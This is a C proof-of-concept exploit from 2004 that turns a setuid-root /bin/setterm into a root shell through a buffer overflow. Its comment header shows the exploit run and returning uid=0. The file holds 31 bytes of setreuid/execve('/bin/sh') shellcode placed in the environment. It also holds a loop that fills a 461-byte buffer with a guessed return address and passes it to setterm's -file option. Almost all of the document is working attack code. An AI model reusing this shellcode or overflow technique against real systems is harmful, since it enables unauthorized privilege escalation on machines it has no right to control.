/*

	wostok-setterm.c:
	setterm local poc by poma the mejtrix hejker (hajni) 
	wostok.org / a lot of # prod 2004

	tested on Slackware 10.0 with: chmod a+s /bin/setterm

	poma@idalia:~/projekty/exploity$ ls -al /bin/setterm
	-rwsr-sr-x  1 root bin 18788 2004-05-27 23:26 /bin/setterm*
	poma@idalia:~/projekty/exploity$ gcc ./wostok-setterm.c -o ./wostok-setterm
	poma@idalia:~/projekty/exploity$ ./wostok-setterm 
	sh-2.05b# id
	uid=0(root) gid=100(users) groups=100(users),11(floppy),17(audio),18(video),19(cdrom)
	
	setreuid(0,0) execve /bin/sh shellcode 31 bytes by bighawk

*/

#include <stdio.h>

#define PATH "/bin/setterm"

char shellcode [] =

   "\x31\xdb"           	// xor     ebx, ebx
   "\x31\xc9"           	// xor     ecx, ecx
   "\xf7\xe3"           	// mul     ebx
   "\xb0\x46"			// mov     al, 70
   "\xcd\x80"			// int     80h
   "\x53"			// push    ebx
   "\x68\x6e\x2f\x73\x68"	// push    dword 68732f6eh
   "\x68\x2f\x2f\x62\x69"	// push    dword 69622f2fh
   "\x89\xe3"			// mov     ebx, esp
   "\x52"			// push    edx
   "\x53"			// push    ebx
   "\x89\xe1"			// mov     ecx, esp
   "\xb0\x0b"			// mov     al, 11
   "\xcd\x80";			// int     80h

int main (int argc, char **argv[])
{
    char *env[3] = {shellcode,NULL};
    char bufor[461];
    int *wskaznik = (int*)bufor;
    int i;
    int ret = 0xbffffffa - strlen(PATH) - strlen(shellcode);
    
    printf("\n\nwostok-setterm.c local poc by poma (shellcode by bighawk).\nwostok.org / alotof#prod2004\n\n");
    for(i=0;i<461;i=i+4) *wskaznik++ = ret;
    execle(PATH,"setterm","-file",bufor,NULL,env);
    return 0;
}
